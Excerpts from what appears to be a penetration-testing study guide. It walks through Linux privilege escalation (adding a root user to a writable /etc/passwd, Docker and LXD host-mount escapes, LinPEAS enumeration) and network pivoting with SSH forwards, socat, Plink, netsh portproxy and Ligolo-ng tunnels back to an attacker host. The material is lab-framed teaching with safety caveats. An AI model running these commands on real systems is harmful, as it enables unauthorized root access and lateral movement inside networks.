text: id="find-the-clue-from-your-starting-access-11">5.1.16.2.1 Find the clue from your starting access Where to investigate: Check permissions on the account/policy file identified by enumeration, including parents and mount state, before any content change. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Effective write/replace permission, known file syntax and a useful identity/policy consumer; preserve the original Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Verify the resulting identity/authorized action and retain the exact change plus recovery copy privately. Failure/next check: Read-only mounts, PAM behavior or syntax mistakes can defeat the candidate. Prefer a narrower reversible consumer when available. stat /etc/passwd /etc/shadow /etc/sudoers getfacl -p /etc/passwd /etc/sudoers 2>/dev/null Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. /etc/passwd: mode=0666 owner=root Effective write for current identity: present Recognize this detail: A sensitive account file appears writable; the authentication implementation and valid record syntax determine its effect. Still missing before method selection: Preserve original state; confirm exact effective write, file consumer, useful identity and recovery/trigger. Outcome after checking Example and next decision Enabled after validation The valid authorized change produces the intended authentication/policy effect: choose this sensitive-file route. Ruled out in this context The filesystem/ACL denies the required operation: reject the writable-file hypothesis. Inconclusive Mode bits without ACL/mount/consumer evidence leave a safe usable transition unresolved. If you do not yet have this clue: start with Prove effective file, directory, ACL and mount control . <h3

text: id="5-why-it-works-11">5.1.16.5 Why it works Sensitive-file write can change authentication or authorization , but the exact file format and consuming implementation determine the effect. A malformed account/policy file can break access. <h3

title: 5.1.16.6.1 Writable /etc/passwd — authorized disposable lab only
text: id="variant-5-1-16-6-1">5.1.16.6.1 Writable /etc/passwd — authorized disposable lab only cp /etc/passwd /tmp/passwd.backup HASH=$(openssl passwd -6 'TEMP_PASSWORD') printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd su - root2 id Preserve a known-good copy and restore it. UID/GID 0 creates a superuser. Do not risk corrupting a host when no safe recovery exists. Also inspect effective access to /etc/sudoers.d , PAM, SSH authorized-key locations and root-executed startup/configuration files. <h3

title: 5.1.17 Use privileged group, daemon or container-management control
text: id="use-privileged-group-daemon-or-container-management-control">5.1.17 Use privileged group, daemon or container-management control Blocks: 8. Operational procedure | Quick sheet <h3

title: 5.1.17.1 Purpose and result

title: 5.1.17.2 Recognition clues
text: id="2-recognition-clues-12">5.1.17.2 Recognition clues Membership or socket ACLs permit controlling a rootful daemon or useful session. <h4

title: 5.1.17.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-12">5.1.17.2.1 Find the clue from your starting access Where to investigate: Inspect groups, local sockets and namespace context, then use only permitted read-only daemon inventory to identify rootful/rootless behavior. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Distinguish host and container namespace, effective UID and the exact host operation. Failure/next check: Rootless mode, user namespaces, policy or absent images can change the route. Do not equate a container prompt with host compromise. id ls -l /var/run/docker.sock cat /proc/1/cgroup Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. groups include docker Socket group: docker; group read/write Container/host context: verify separately Recognize this detail: Effective socket access suggests daemon control; group text alone does not establish host-affecting rootful operations. Still missing before method selection: Check API acceptance, rootful/rootless and namespace policy, available resources and the specific host operation. Outcome after checking Example and next decision Enabled after validation A rootful daemon permits the required host-affecting operation: use that documented route. Ruled out in this context A rootless/user-namespaced daemon cannot grant the assumed host-root effect: reject that chain. Inconclusive Socket presence without usable API permissions leaves the control claim unresolved. If you do not yet have this clue: start with Establish Linux state and choose an escalation candidate . <h3

text: id="3-prerequisites-12">5.1.17.3 Prerequisites Starting access: A verified Linux foothold with a known effective UID, groups and filesystem context. Required conditions: Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation. <h3

title: 5.1.17.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-12">5.1.17.4 Discover and verify prerequisites id ls -l /var/run/docker.sock findmnt cat /proc/1/cgroup <h3

title: 5.1.17.5 Why it works
text: id="5-why-it-works-12">5.1.17.5 Why it works Controlling a rootful container daemon can grant host-mount operations; root inside a restricted/rootless container is a different authority. Socket presence alone proves no API access. <h3

title: 5.1.17.6 Execute and choose variants
text: id="6-execute-and-choose-variants-12">5.1.17.6 Execute and choose variants id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null lxc list 2>/dev/null Group candidates include docker , lxd / lxc , disk , shadow , adm , systemd-journal and libvirt . Prove the associated resource and effective permission. <summary

title: 5.1.17.6.1 Rootful Docker daemon with an available image
text: id="variant-5-1-17-6-1">5.1.17.6.1 Rootful Docker daemon with an available image docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect. <summary

title: 5.1.17.6.2 LXD/LXC with an available image alias
text: id="variant-5-1-17-6-2">5.1.17.6.2 LXD/LXC with an available image alias lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support. <h3

title: 5.1.17.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-12">5.1.17.7 Worked example — hypothetical Observation: docker group access reaches a rootful daemon. Test: inspect its available image and mount permissions using the documented procedure. Illustrative output: a controlled container can read the intended host filesystem. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Vulnerable package/kernel state, architecture, mitigations, namespaces and documented exploit-specific conditions Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Failure/next check: Wrong build, missing feature or mitigation can invalidate the PoC. Choose another evidence-backed candidate rather than cycling random local exploits. uname -a cat /etc/os-release getconf LONG_BIT Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Kernel release: KERNEL_RELEASE Distribution package/build: VENDOR_BUILD Required vulnerable feature: not yet verified Recognize this detail: A version-associated advisory is a candidate; backports and feature state determine applicability. Still missing before method selection: Collect uname and the distribution's package/build plus architecture. Match the advisory's vulnerable feature and vendor patch status before choosing a PoC; try a confirmed sudo/file/credential route first when one exists. Outcome after checking Example and next decision Enabled after validation Affected code/configuration and compatible reviewed PoC are established: select its bounded test. Ruled out in this context The vendor build includes the fix or required feature is absent: reject that exploit. title: 5.1.20.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-15">5.1.20.2.1 Find the clue from your starting access Where to investigate: Use known manual gaps and the host/runtime context to choose a reviewed enumerator; inspect each highlighted finding against native evidence. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Read linpeas.txt. Confirm a reported sudo rule with sudo -l, a privileged path with namei/stat/getfacl, or a scheduled consumer with pspy before using that finding Failure/next check: Script blocked or output empty: check the shell, transfer integrity and output path, then use the native checks for the observed rule/file/job. Empty collector output does not rule out escalation id uname -m command -v bash python3 ls -ld /tmp Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Enumerator candidate: writable /opt/APP/script.sh Consumer identity: unknown Trigger: unknown Recognize this detail: The highlight supplies a candidate object, not the missing privileged consumer or execution trigger. Still missing before method selection: Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check. Outcome after checking Example and next decision Enabled after validation The full manual chain validates: follow its owning method. Ruled out in this context Only a low-privileged process consumes the object: reject the escalation hypothesis. Inconclusive Missing tools or restricted /proc can hide evidence; investigate application-specific paths manually. If you do not yet have this clue: start with Establish Linux state and choose an escalation candidate . <h3

title: 5.1.20.6 Execute and choose variants
text: id="6-execute-and-choose-variants-15">5.1.20.6 Execute and choose variants For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit: sh ./linpeas.sh | tee linpeas.txt Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline. ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt LinPEAS optional flags vary by build. Read the local ./linpeas.sh -h before selecting broader checks; they are not the automatic baseline. LSE progresses from default to -l1 , then -l2 only if needed. unix-privesc-check detailed is slower and more false-positive-prone. For every highlight: exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate. <h3

title: 6.1.3 Reach internal services
text: id="reach-internal-services">6.1.3 Reach internal services Strategy map | Master Notes | Operational index | Cheatsheets A tunnel moves traffic; it does not grant destination authorization . Draw listener location, connection initiator, remote destination, DNS resolution and return path separately. Speedrun blocks: 13; study fundamentals before 10–12. Documented methods: 16. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 6.1.3.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">6.1.3.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 6.1.3.1.1 Enumerate what the pivot can actually reach
text: id="enumerate-what-the-pivot-can-actually-reach">6.1.3.1.1 Enumerate what the pivot can actually reach Run route/listener checks on the pivot itself; do not infer its access from the attacker machine. ip addr ip route ss -lntup If One internal TCP endpoint is reachable from the pivot: Draw the local/pivot listener and initiator before choosing a fixed forward. → Forward a selected service through an SSH client-side listener . If Several internal services need proxy/routed access: Match the client protocol to SOCKS or a TUN route. → Provide SOCKS access through SSH dynamic forwarding . Otherwise: The pivot cannot reach the destination: fix that leg before adding a tunnel. → Discover pivot interfaces, routes and internal service context . <h3

title: 6.1.3.1.2 Use SSH forwarding for the required direction
text: id="use-ssh-forwarding-for-the-required-direction">6.1.3.1.2 Use SSH forwarding for the required direction Use this when the attacker can SSH to a pivot that can reach the destination; remote forwarding reverses the listener placement. ssh -N \ -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p SSH_PORT USER@PIVOT \ -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 If The forwarded service responds through the listener: Re-enumerate that destination with the matching service client. → Identify applications and validate selected NSE checks . If Only the pivot can initiate the tunnel connection: Select the reverse/listener arrangement deliberately. → Expose an SSH-client-side destination through a server-side remote listener . Otherwise: The listener exists but the app fails: test destination reachability and DNS through the chosen path. → Preserve DNS, Kerberos names and time across a pivot . <h3

title: 6.1.3.1.3 Use Ligolo for a justified routed requirement
text: id="use-ligolo-for-a-justified-routed-requirement">6.1.3.1.3 Use Ligolo for a justified routed requirement Use the version-specific agent/proxy procedure and route setup. A tunnel session alone is not a working destination route. ./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT If The selected subnet is routed and the destination responds: Re-run service discovery from that new position. → Identify applications and validate selected NSE checks . If Delivery works but the payload callback fails: Build and verify the separately needed return/callback path. → Build the callback and delivery routes separately from the attack route . Otherwise: Route/session setup fails: inspect the route, interface privileges and each connection leg. → Discover pivot interfaces, routes and internal service context . <h2

title: 6.1.3.2 Discovery workflow
text: id="discovery-workflow">6.1.3.2 Discovery workflow Start from the pivot's current shell/process or accepted SSH access; another reachable subnet and an operational tunnel are not assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Inspect pivot interfaces, routes, local listeners and destination reachability: Discover pivot interfaces, routes and internal service context . Draw listener location and connection initiator before fixed or SSH forwarding: Relay a single TCP service through a fixed forward ; Forward a selected service through an SSH client-side listener ; Expose an SSH-client-side destination through a server-side remote listener . Choose proxy versus routed access according to the real client/protocol requirements: Provide SOCKS access through SSH dynamic forwarding ; Use ProxyChains, native SOCKS clients and SSH jump paths appropriately ; Route a selected internal subnet through Ligolo-ng . Validate names, KDC access and the separately required delivery/callback route: Preserve DNS, Kerberos names and time across a pivot ; Build the callback and delivery routes separately from the attack route . For additional hops test each leg before chaining the final application: Compose multiple pivots and validate every connection leg . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 6.1.3.3 Method families
text: id="method-families">6.1.3.3 Method families Network position and fixed relays: Discover pivot interfaces, routes and internal service context , Relay a single TCP service through a fixed forward . SSH listener direction and proxy access: Forward a selected service through an SSH client-side listener , Provide SOCKS access through SSH dynamic forwarding , Expose an SSH-client-side destination through a server-side remote listener , Expose a server-side SOCKS proxy through remote dynamic SSH forwarding , Use ProxyChains, native SOCKS clients and SSH jump paths appropriately . Transparent and Windows forwarding: Route a selected subnet through sshuttle , Forward from Windows with OpenSSH, Plink or Netsh . Alternative carriers and routed agents: Use a reverse Chisel SOCKS or fixed TCP tunnel , Use forward Chisel SOCKS and version-supported UDP routing , Route a selected internal subnet through Ligolo-ng , Conditional: tunnel through controlled DNS infrastructure . Names, return paths and multiple hops: Preserve DNS, Kerberos names and time across a pivot , Build the callback and delivery routes separately from the attack route , Compose multiple pivots and validate every connection leg . <h2

title: 6.1.3.5.5 Why it works
text: id="5-why-it-works">6.1.3.5.5 Why it works A dual-homed host can connect networks without forwarding packets for arbitrary clients. Select fixed forward, application proxy or routed tunnel according to the required protocol and permissions. <h3

title: 6.1.3.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">6.1.3.5.6 Execute and choose variants APPLICATION TOOL -> local listener / SOCKS endpoint / TUN route -> tunnel transport endpoint -> pivot exit -> internal destination service CALLBACK TARGET -> pivot listener or routable address -> relay/tunnel -> final listener Record: TOOL_HOST -> ENTRY_SOCKET/ROUTE -> TRANSPORT -> PIVOT -> DESTINATION application protocol | TCP/UDP | initiator | bind address | DNS point credential/SPN name | callback route | privilege | cleanup objects Do not use “pivot works” as a single state. Confirm these layers separately: the tunnel process started; its listener/transport connection exists; the pivot can reach the intended destination socket; the local route, forward or proxy points at the right exit; the application actually uses that path; name resolution and authentication match the application; a callback, if required, has its own return path. Linux: id ip -brief address ip route ip neigh ss -lntup cat /etc/resolv.conf Windows: whoami /all ipconfig /all route print arp -a netstat -ano PowerShell selected endpoints: Get-NetIPConfiguration Get-NetRoute -AddressFamily IPv4 | Sort-Object DestinationPrefix,RouteMetric Get-NetTCPConnection -State Listen Get-DnsClientServerAddress -AddressFamily IPv4 An interface or route proves a possible network position, not destination reachability. Validate one justified socket from the pivot before building a tunnel. nc -nvz -w 3 INTERNAL_HOST INTERNAL_PORT curl -v --connect-timeout 5 http://INTERNAL_HOST:INTERNAL_PORT/ Test-NetConnection INTERNAL_HOST -Port INTERNAL_PORT Need Baseline Choose when Main limitation One TCP service through an SSH pivot SSH local forward Kali can initiate SSH to pivot One destination socket per forward Many TCP destinations through SSH pivot SSH dynamic forward Kali can initiate SSH to pivot SOCKS/client compatibility Pivot can connect outward but inbound access is blocked SSH remote or remote-dynamic forward Pivot has OpenSSH client and can reach Kali SSH Kali SSH policy; OpenSSH version for remote dynamic SSH hop directly to internal SSH ProxyJump Both pivot and destination provide SSH SSH-only path Simple Linux TCP relay Socat Binary already exists and listener can be exposed Clear TCP relay; no authentication/encryption Transparent selected subnets through SSH sshuttle Suitable SSH server with Python; local privileges TCP/DNS-oriented, local firewall changes Windows SSH-based forward Built-in ssh.exe or Plink Compatible client exists and outbound SSH works Server policy and credential/host-key handling Windows native fixed TCP relay netsh interface portproxy Elevated token ; target modification acceptable TCP only; firewall/IP Helper/stateful cleanup Outbound HTTP/WebSocket-shaped tunnel Chisel Pivot can run matching binary and reach server Client/server compatibility and proxy/client transport limits Routed access for ordinary clients Ligolo-ng Agent can reach proxy and TUN/route setup is possible Userland stack is not identical to direct raw networking DNS is the only viable egress dnscat2 DNS path plus authoritative/direct server control Slow/noisy, infrastructure and client required Prefer one explicit forward for one known service. Use SOCKS when several TCP endpoints must be explored. Use a routed pivot when many ordinary tools must operate without proxy wrappers. Do not add a multi-host route when command execution directly on the pivot is sufficient. Kali/Linux: ss -lntup ip -brief address ip route ps -ef | grep -E '[s]sh .*-[LDR]|[c]hisel|[l]igolo|[s]ocat|[s]shuttle' Windows: netstat -ano tasklist netsh interface portproxy show all netsh advfirewall firewall show rule name="OSCP Pivot LOCAL_PORT" Record: exact process/command and version; bind address and port; transport direction and initiator; pivot and destination; routes/name mappings/configuration files added; simple TCP proof and final application proof; callback proof where applicable; cleanup command and result. Stop tunnel processes and remove TUN routes, Ligolo listeners, temporary mappings, password files, Netsh rules and firewall exceptions after the authorized task. <h3

title: 6.1.3.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">6.1.3.6.6 Execute and choose variants On a Linux pivot, expose one internal TCP service: socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork \ TCP:INTERNAL_HOST:INTERNAL_PORT Loopback-only relay for another local tunnel stage: socat -ddd TCP-LISTEN:LOCAL_PORT,bind=127.0.0.1,reuseaddr,fork \ TCP:INTERNAL_HOST:INTERNAL_PORT Verify the listener on the pivot with ss -lntp | grep LOCAL_PORT . Run nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT from the intended client to test client-to-pivot reachability. These checks run on different machines: ss -lntp | grep LOCAL_PORT nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT fork handles multiple connections. reuseaddr eases rebinding after restart. Socat does not add authentication or encryption to this relay; bind narrowly and remove the process when finished. A listener can exist even when the pivot-to-destination connection fails. <h3

text: id="find-the-clue-from-your-starting-access-2">6.1.3.7.2.1 Find the clue from your starting access Where to investigate: Use accepted SSH and the SSH server's verified reachability to a selected internal/loopback service; identify where the local client needs its listener. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A pivot identity/process or reachable SSH service and a drawn source-to-destination path Requires: Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route Action class: May start listeners and change routing/forwarding state. Stop/verify: Verify listening address plus the destination application's handshake and preserve correct hostname/SPN semantics when needed. Failure/next check: Administrative-prohibited indicates SSH forwarding policy; address-in-use is a local bind problem; timeout can be the remote leg. ssh -v -p SSH_PORT USER@PIVOT ss -lnt Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Assessment client -> SSH server: accepted SSH server -> 127.0.0.1:INTERNAL_PORT: needed Desired listener: assessment client Recognize this detail: Client-side listener plus server-side destination is the -L direction; destination loopback belongs to the SSH server. Still missing before method selection: Verify forwarding policy, local bind and server-to-destination application access. Outcome after checking Example and next decision Enabled after validation The permitted local forward delivers the service handshake: choose -L. Ruled out in this context The server cannot reach the selected destination: reject this topology regardless of valid SSH login. Inconclusive SSH login alone leaves forwarding policy unknown. title: 6.1.3.7.5 Why it works
text: id="5-why-it-works-2">6.1.3.7.5 Why it works With -L the listener is on the SSH client and the remote destination is reached from the SSH server. localhost in the destination therefore means the server's loopback. <h3

title: 6.1.3.7.6 Execute and choose variants
text: id="6-execute-and-choose-variants-2">6.1.3.7.6 Execute and choose variants Run on Kali when Kali can SSH to the pivot: ssh -N \ -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p SSH_PORT USER@PIVOT \ -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 Use the listener as though it were the internal service: nc -nvz 127.0.0.1 LOCAL_PORT curl -v http://127.0.0.1:LOCAL_PORT/ The SSH server/pivot resolves and connects to INTERNAL_HOST . Bind to 127.0.0.1 unless another authorized local host must use the forward; -g or a non-loopback bind expands exposure. Add reliability and attributable failure to transport-only sessions: -N -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ExitOnForwardFailure proves requested listening sockets were established. It does not prove the final destination is reachable through them. <h3

text: id="find-the-clue-from-your-starting-access-3">6.1.3.8.2.1 Find the clue from your starting access Where to investigate: From accepted SSH and a mapped internal service set determine whether each required client can use a SOCKS TCP connection. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A pivot identity/process or reachable SSH service and a drawn source-to-destination path Requires: SSH forwarding allowed and clients that support SOCKS or compatible interception; DNS behavior must be chosen explicitly Action class: May start listeners and change routing/forwarding state. Stop/verify: Verify one application through the proxy, then check each client's actual proxy and DNS behavior. Failure/next check: A working proxy does not make raw SYN/UDP scans viable. Use connect-based clients or a suitable routed tunnel. ssh -v -p SSH_PORT USER@PIVOT Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. SSH path: accepted Needed destinations: several TCP services Client proxy support: inspect Recognize this detail: Multiple client-selected TCP destinations suggest a dynamic SOCKS listener rather than many fixed forwards. Still missing before method selection: Check SSH forwarding, listener bind, native/intercepted client support and DNS resolution location. Outcome after checking Example and next decision Enabled after validation Proxy-aware clients reach the selected applications: choose dynamic SOCKS. Ruled out in this context The needed operation relies on raw/unsupported UDP traffic: reject ordinary TCP SOCKS for that operation. Inconclusive A working SSH session without a proxy-aware test leaves application/proxy compatibility unknown. If you do not yet have this clue: start with Use SSH passwords, keys and forwarding-capable access . <h3

text: id="2-recognition-clues-4">6.1.3.9.2 Recognition clues The useful side can initiate SSH outward but cannot accept an inbound management connection. <h4

title: 6.1.3.9.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-4">6.1.3.9.2.1 Find the clue from your starting access Where to investigate: Identify an outbound-only pivot-to-SSH-server path and a service reached from that SSH client/pivot; decide where the remote listener is needed. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A pivot identity/process or reachable SSH service and a drawn source-to-destination path Requires: Outbound SSH route, accepted identity, server forwarding/GatewayPorts policy and reachability to the chosen client-side destination Action class: May start listeners and change routing/forwarding state. title: 6.1.3.11.6 Execute and choose variants
text: id="6-execute-and-choose-variants-6">6.1.3.11.6 Execute and choose variants Direct SSH through an SSH pivot: ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST SSH through an existing SOCKS5 endpoint with Ncat: ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \ TARGET_USER@INTERNAL_HOST %h and %p are replaced with the destination host and port. Prefer this native proxy route when ProxyChains interposition is unreliable. <summary

title: 6.1.3.11.6.1 Use an SSH configuration for repeated access
text: id="variant-6-1-3-11-6-1">6.1.3.11.6.1 Use an SSH configuration for repeated access Host pivot HostName PIVOT User PIVOT_USER Host internal HostName INTERNAL_HOST User TARGET_USER ProxyJump pivot ssh internal scp FILE internal:DESTINATION_PATH Use a task-specific configuration rather than repeatedly editing a shared global file: strict_chain proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks5 127.0.0.1 1080 proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/ proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \ 'DOMAIN/USER:PASSWORD@INTERNAL_HOST' Constraints: ProxyChains hooks socket calls in dynamically linked programs; some static binaries, scripts, child processes or dynamically loaded modules bypass or break the hook. ProxyChains supports TCP only. It does not proxy UDP, ICMP, SYN scans or pcap-based discovery. For Nmap use -sT -Pn -n with a focused port list. Proxy scanning is slow and is not a replacement for discovery from the pivot. proxy_dns moves supported hostname resolution through the proxy, but application behavior varies. -n prevents Nmap's local reverse lookups. Prefer an application's native proxy option when available. Native examples: curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/ ncat --proxy-type socks5 --proxy 127.0.0.1:1080 INTERNAL_HOST INTERNAL_PORT <h3

text: id="5-why-it-works-8">6.1.3.13.5 Why it works OpenSSH/Plink carry SSH tunnels; Netsh portproxy provides a fixed TCP mapping and does not authenticate to the destination. Their rights and service prerequisites differ. <h3

title: 6.1.3.13.6 Execute and choose variants
text: id="6-execute-and-choose-variants-8">6.1.3.13.6 Execute and choose variants <h5

title: 6.1.3.13.6.1.1 Built-in OpenSSH client
text: id="81-built-in-openssh-client">6.1.3.13.6.1.1 Built-in OpenSSH client where ssh.exe ssh.exe -V ssh.exe -N -R 127.0.0.1:1080 KALI_USER@LHOST -p KALI_SSH_PORT -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 The same -L , -D , -R , ProxyJump and ProxyCommand concepts apply to current Windows OpenSSH. Remote dynamic forwarding depends on the client version. <h5

title: 6.1.3.13.6.1.2 Plink
text: id="82-plink">6.1.3.13.6.1.2 Plink Remote fixed forward from Windows to Kali: plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^ -l KALI_USER -pwfile C:\PATH\kali-password.txt ^ -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT ^ -P KALI_SSH_PORT LHOST Local dynamic SOCKS on Windows: plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^ -l SSH_USER -pwfile C:\PATH\ssh-password.txt ^ -D 127.0.0.1:1080 -P SSH_PORT PIVOT Current Plink supports -L , -R and -D , but not OpenSSH's remote-dynamic shorthand. -batch prevents an unseen prompt from hanging; pair it with a verified -hostkey . -pwfile avoids a literal password in the command line but creates a sensitive file that must be protected and removed. Prefer a key or existing authenticated context where feasible. <h5

title: 6.1.3.13.6.1.3 Netsh portproxy
text: id="83-netsh-portproxy">6.1.3.13.6.1.3 Netsh portproxy Elevated Windows shell: netsh interface portproxy add v4tov4 ^ listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT ^ connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT netsh interface portproxy show all netstat -ano -p tcp | findstr ":LOCAL_PORT" If the existing firewall policy does not already allow the listener and a change is authorized: netsh advfirewall firewall add rule name="OSCP Pivot LOCAL_PORT" ^ dir=in action=allow protocol=TCP localport=LOCAL_PORT Cleanup: netsh interface portproxy delete v4tov4 ^ listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT netsh advfirewall firewall delete rule name="OSCP Pivot LOCAL_PORT" portproxy requires an elevated token, forwards TCP rather than UDP, modifies persistent host configuration and may depend on the IP Helper service. A stored rule or listening socket still does not prove the destination is reachable. Record and remove both the proxy and any firewall rule. <h3

title: 6.1.3.16.5 Why it works
text: id="5-why-it-works-11">6.1.3.16.5 Why it works A TUN-style interface lets applications use a route rather than per-tool SOCKS settings. Agent loopback aliases and reverse listeners solve different destination/callback problems and require their documented configuration. <h3

title: 6.1.3.16.6 Execute and choose variants
text: id="6-execute-and-choose-variants-11">6.1.3.16.6 Execute and choose variants <h5

title: 6.1.3.16.6.1.1 Proxy and agent
text: id="101-proxy-and-agent">6.1.3.16.6.1.1 Proxy and agent On Kali: ./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT In the proxy console, obtain the fingerprint: certificate_fingerprint On the pivot: ./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT -ignore-cert is a controlled-lab/debug fallback, not the baseline. <h5

title: 6.1.3.16.6.1.2 Current managed interface and route
text: id="102-current-managed-interface-and-route">6.1.3.16.6.1.2 Current managed interface and route In the Ligolo console: interface_create --name ligolo session ifconfig interface_add_route --name ligolo --route INTERNAL_SUBNET tunnel_start --tun ligolo Manual Linux alternative: sudo ip tuntap add user "$USER" mode tun ligolo sudo ip link set ligolo up sudo ip route add INTERNAL_SUBNET dev ligolo Then use normal clients: ip route get INTERNAL_HOST nmap -sT -Pn -n -p PORTS INTERNAL_HOST curl -v http://INTERNAL_HOST:PORT/ Ligolo translates connections through a userland network stack. Ordinary TCP clients generally work without ProxyChains, but raw-packet assumptions, ICMP details and some UDP behavior can differ from direct access. Use connect-based validation first. <h5

title: 6.1.3.16.6.1.3 Pivot loopback services
text: id="103-pivot-loopback-services">6.1.3.16.6.1.3 Pivot loopback services Ligolo maps its special 240.0.0.0/4 range to the selected agent's loopback. Add one narrow route: sudo ip route add 240.0.0.1/32 dev ligolo nmap -sT -Pn -n -p PORTS 240.0.0.1 Use this only when the desired service is bound to 127.0.0.1 on the agent. <h5

title: 6.1.3.16.6.1.4 Callback or file-server listener on the agent
text: id="104-callback-or-file-server-listener-on-the-agent">6.1.3.16.6.1.4 Callback or file-server listener on the agent In the selected Ligolo session: listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp listener_list Kali listener: ncat -lvn 127.0.0.1 KALI_PORT An internal target connects to PIVOT_REACHABLE_IP:PIVOT_PORT ; Ligolo relays it to Kali's loopback listener. Cleanup: listener_stop LISTENER_ID <h3
